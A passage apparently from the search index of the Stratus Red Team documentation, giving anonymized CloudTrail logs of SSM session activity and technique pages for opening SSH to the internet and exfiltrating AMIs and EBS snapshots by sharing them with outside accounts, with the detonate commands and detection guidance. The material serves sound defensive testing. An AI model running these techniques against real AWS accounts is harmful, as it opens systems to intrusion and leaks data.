\"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a7175b36-d81e-4865-be81-212ca57308df\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:18:53Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"09a037ea-6fe5-4df3-bfeb-62c2de373b83\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"5bdf2db7-edd7-42cd-82f1-ee0196606656\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:18:52Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"6fb104db-448f-4055-b30c-c72cdc9cabcc\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"03ba7d84-509a-4bb9-bc48-959aa989b5ff\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:18:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"796082ea-1ed9-422e-8316-c8696499cd1e\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a29037ea-ed15-4025-9a54-ff70f11ca95c\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:18:49Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"5f7f7d07-7c66-41aa-8fb8-dacd955626df\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f8f0460c-476b-42b7-9cfb-cd6345e2aad1\",\n      \"eventName\": \"TerminateSession\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"9147312c-7312-46d4-aa91-798728055424\",\n      \"requestParameters\": {\n         \"sessionId\": \"christophe-wzleysigzmbd6fmkefjqvt5w4u\"\n      },\n      \"responseElements\": {\n         \"sessionId\": \"christophe-wzleysigzmbd6fmkefjqvt5w4u\"\n      },\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8086b250-d29c-4659-9aec-86c8446a3895\",\n      \"eventName\": \"StartSession\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"d81b3311-b5aa-4782-ab43-c7af5e237aee\",\n      \"requestParameters\": {\n         \"target\": \"i-eA1d1296c1dE3Aa1f\"\n      },\n      \"responseElements\": {\n         \"sessionId\": \"christophe-wzleysigzmbd6fmkefjqvt5w4u\",\n         \"streamUrl\": \"wss://ssmmessages.me-northwest-3r.amazonaws.com/v1/data-channel/christophe-wzleysigzmbd6fmkefjqvt5w4u?role=publish_subscribe\\u0026cell-number=AAEAAbIWRNYnEkrB64bhGiedJQR3zYzBwUJyTNxc854+f3IBAAAAAGarfUW5QwfI91t6LkgX/EqdDx6EluDPvaUGK2bMPeDUpZ8JCNDVkDD7\",\n         \"tokenValue\": \"Value hidden due to security reasons.\"\n      },\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"131c198f-7042-4c88-be71-545471d55f4c\",\n      \"eventName\": \"TerminateSession\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"577db5d7-12b4-49a6-87eb-6ea2890065bd\",\n      \"requestParameters\": {\n         \"sessionId\": \"christophe-bkqs75qpcrtlxk5paaytrydm2e\"\n      },\n      \"responseElements\": {\n         \"sessionId\": \"christophe-bkqs75qpcrtlxk5paaytrydm2e\"\n      },\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"10057a87-1da5-4c7d-a411-e41543dc91f5\",\n      \"eventName\": \"StartSession\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"5cc369d7-d3e9-41e0-a677-14e8c9c18c8e\",\n      \"requestParameters\": {\n         \"target\": \"i-d0b6DCBA8984dE148\"\n      },\n      \"responseElements\": {\n         \"sessionId\": \"christophe-s7uathgenk3m4qa2s33wio5gpu\",\n         \"streamUrl\": \"wss://ssmmessages.me-northwest-3r.amazonaws.com/v1/data-channel/christophe-s7uathgenk3m4qa2s33wio5gpu?role=publish_subscribe\\u0026cell-number=AAEAASNZon/688w6/ZL2nfwe5JxliimfvbKltR2/CMq9mU3DAAAAAGarfUU7baqkmRTOTruWRhsNBxa9VYTF4cuEPM/a0XdVPGUYQNU1KAa3\",\n         \"tokenValue\": \"Value hidden due to security reasons.\"\n      },\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"60fd77a0-1ce9-40a1-b24b-0a598a169de9\",\n      \"eventName\": \"TerminateSession\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"ca9f1a4d-f89b-468d-9858-8e628165c8e7\",\n      \"requestParameters\": {\n         \"sessionId\": \"christophe-s7uathgenk3m4qa2s33wio5gpu\"\n      },\n      \"responseElements\": {\n         \"sessionId\": \"christophe-s7uathgenk3m4qa2s33wio5gpu\"\n      },\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"32e8a07f-4751-4081-882e-958a25231c56\",\n      \"eventName\": \"StartSession\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"bfa7688d-0e78-4252-b5f6-1a445c82f109\",\n      \"requestParameters\": {\n         \"target\": \"i-d3720C7af6fCfF2B2\"\n      },\n      \"responseElements\": {\n         \"sessionId\": \"christophe-bkqs75qpcrtlxk5paaytrydm2e\",\n         \"streamUrl\": \"wss://ssmmessages.me-northwest-3r.amazonaws.com/v1/data-channel/christophe-bkqs75qpcrtlxk5paaytrydm2e?role=publish_subscribe\\u0026cell-number=AAEAAeHX0bqbU5dmbfb/NJVjO7TQopSahDHtyQVUjSI6yFXSAAAAAGarfUSzqvoBC+mhEuJQf0+1Y3iTcwzVAhL1LviE3BBll/7GdCowEhwg\",\n         \"tokenValue\": \"Value hidden due to security reasons.\"\n      },\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/","title":"Open Ingress Port 22 on a Security Group","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Exfiltration</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Impair Defenses: Disable or Modify Cloud Firewall (T1562.007)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/#description","title":"Description","text":"<p>Opens ingress traffic on port 22 from the Internet (0.0.0.0/0).</p> <p>Warm-up: </p> <ul> <li>Create a VPC and a security group inside it.</li> </ul> <p>Detonation: </p> <ul> <li>Call ec2:AuthorizeSecurityGroupIngress to allow ingress traffic on port 22 from 0.0.0.0/0.</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.ec2-security-group-open-port-22-ingress\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/#detection","title":"Detection","text":"<p>You can use the CloudTrail event <code>AuthorizeSecurityGroupIngress</code> when:</p> <ul> <li><code>requestParameters.cidrIp</code> is <code>0.0.0.0/0</code> (or an unknown external IP)</li> <li>and <code>requestParameters.fromPort</code>/<code>requestParameters.toPort</code> is not a commonly exposed port or corresponds to a known administrative protocol such as SSH or RDP</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>ec2:AuthorizeSecurityGroupIngress</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"us-northeast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9fd68588-ecbf-4528-a345-199fa6bb0821\",\n      \"eventName\": \"AuthorizeSecurityGroupIngress\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:23:55Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"032092706103\",\n      \"requestID\": \"dc1dabbf-d7cb-4966-a3de-ac69d5cfc633\",\n      \"requestParameters\": {\n         \"cidrIp\": \"208.236.235.254/0\",\n         \"fromPort\": 22,\n         \"groupId\": \"sg-003dc7f1f1c686164\",\n         \"ipPermissions\": {},\n         \"ipProtocol\": \"tcp\",\n         \"toPort\": 22\n      },\n      \"responseElements\": {\n         \"_return\": true,\n         \"requestId\": \"dc1dabbf-d7cb-4966-a3de-ac69d5cfc633\",\n         \"securityGroupRuleSet\": {\n            \"items\": [\n               {\n                  \"cidrIpv4\": \"208.236.235.254/0\",\n                  \"fromPort\": 22,\n                  \"groupId\": \"sg-003dc7f1f1c686164\",\n                  \"groupOwnerId\": \"032092706103\",\n                  \"ipProtocol\": \"tcp\",\n                  \"isEgress\": false,\n                  \"securityGroupRuleId\": \"sgr-09b3e3d2ca1edf2a2\",\n                  \"toPort\": 22\n               }\n            ]\n         }\n      },\n      \"sourceIPAddress\": \"253.243.215.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.us-northeast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_1004a4ff-b486-4981-a84b-6322905f37cc\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAXW7UJ577KFYIAHIM\",\n         \"accountId\": \"032092706103\",\n         \"arn\": \"arn:aws:iam::032092706103:user/christophe\",\n         \"principalId\": \"AIDAQ5Y2TGCDATQV6SRP\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/","title":"Exfiltrate an AMI by Sharing It","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Exfiltration</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/#description","title":"Description","text":"<p>Exfiltrates an AMI by sharing it with an external AWS account.</p> <p>Warm-up: </p> <ul> <li>Create an AMI.</li> </ul> <p>Detonation: </p> <ul> <li>Share the AMI with an external, fictitious AWS account.</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.ec2-share-ami\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>ModifyImageAttribute</code> event, when <code>requestParameters.launchPermission</code> shows that the AMI was shared with a new or unknown AWS account, such as:</p> <pre><code>\"requestParameters\": {\n  \"launchPermission\": {\n    \"add\": {\n      \"items\": [{ \"userId\": \"012345678901\" }]\n    }\n  },\n  \"attributeType\": \"launchPermission\",\n  \"imageId\": \"ami-0b87ea1d007078d18\"\n}</code></pre> <p>An attacker can also make an AMI completely public. In this case, the <code>item</code> entry  will look like <code>{\"groups\":\"all\"}</code>. </p>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ami/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>ec2:ModifyImageAttribute</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"me-south-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1f00bcfa-e050-4c2e-b99b-768ebe3a3dd3\",\n      \"eventName\": \"ModifyImageAttribute\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:25:57Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"118238665043\",\n      \"requestID\": \"dd81ae39-a261-4e85-87a4-01fe22abc602\",\n      \"requestParameters\": {\n         \"attributeType\": \"launchPermission\",\n         \"imageId\": \"ami-de1fbCab6ccB03e6D\",\n         \"launchPermission\": {\n            \"add\": {\n               \"items\": [\n                  {\n                     \"userId\": \"846424999548\"\n                  }\n               ]\n            }\n         }\n      },\n      \"responseElements\": {\n         \"_return\": true,\n         \"requestId\": \"dd81ae39-a261-4e85-87a4-01fe22abc602\"\n      },\n      \"sourceIPAddress\": \"253.19.58.252\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.me-south-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_a532baf6-7731-4c0f-b089-48508276f787\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA40XZ2OQU8R4QKTAC\",\n         \"accountId\": \"118238665043\",\n         \"arn\": \"arn:aws:iam::118238665043:user/christophe\",\n         \"principalId\": \"AIDAYO61EC4B4W5G6BXN\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/","title":"Exfiltrate EBS Snapshot by Sharing It","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Exfiltration</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Modify Cloud Compute Infrastructure: Create Snapshot (T1578.001)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/#description","title":"Description","text":"<p>Exfiltrates an EBS snapshot by sharing it with an external AWS account.</p> <p>Warm-up: </p> <ul> <li>Create an EBS volume and a snapshot.</li> </ul> <p>Detonation: </p> <ul> <li>Call ec2:ModifySnapshotAttribute to share the snapshot with an external, fictitious AWS account.</li> </ul>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>ModifySnapshotAttribute</code> event, when <code>requestParameters.createVolumePermission</code> shows that the EBS snapshot was shared with a new or unknown AWS account, such as:</p> <pre><code>\"requestParameters\": {\n  \"snapshotId\": \"snap-01b3f7d87a02559a1\",\n  \"attributeType\": \"CREATE_VOLUME_PERMISSION\",\n  \"createVolumePermission\": {\n    \"add\": {\n      \"items\": [{ \"userId\": \"111111111111\" }]\n    }\n  }\n}</code></pre> <p>An attacker can also make an EBS snapshot completely public. In this case, the <code>item</code> entry  will look like <code>{\"groups\":\"all\"}</code>. </p> <p>When an attacker copies the snapshot to their own AWS account or creates an EBS volume for it, the <code>SharedSnapshotCopyInitiated</code> (respectively <code>SharedSnapshotVolumeCreated</code>) event is logged (see AWS docs).  In that case, <code>userIdentity.accountId</code> contains the attacker's account ID and <code>recipientAccountId</code> contains the victim's account ID where the snapshot was originally created.</p> <pre><code>{\n  \"userIdentity\": {\n    \"invokedBy\": \"ec2.amazonaws.com\",\n    \"type\": \"AWSAccount\",\n    \"accountId\": \"999999999999\"\n  },\n  \"eventSource\": \"ec2.amazonaws.com\",\n  \"eventVersion\": \"1.08\",\n  \"eventTime\": \"2022-09-27T07:58:49Z\",\n  \"service\": \"cloudtrail\",\n  \"eventName\": \"SharedSnapshotCopyInitiated\",\n  \"eventType\": \"AwsServiceEvent\",\n  \"eventCategory\": \"Management\",\n  \"awsRegion\": \"us-east-1\",\n    \"serviceEventDetails\": {\n    \"snapshotId\": \"snap-12345\"\n  },\n  \"readOnly\": false,\n  \"managementEvent\": true,\n  \"recipientAccountId\": \"111111111111\"\n }\n </code></pre> <p>Note that detonating this attack technique with Stratus Red Team does not simulate an attacker accessing the snapshot from their account (only sharing it publicly from your account).</p>"},{"location":"attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>ec2:ModifySnapshotAttribute</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"me-central-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"6897ff63-d738-445c-9e86-43e5b1f8e12f\",\n      \"eventName\": \"ModifySnapshotAttribute\",\n      \"eventSource\": 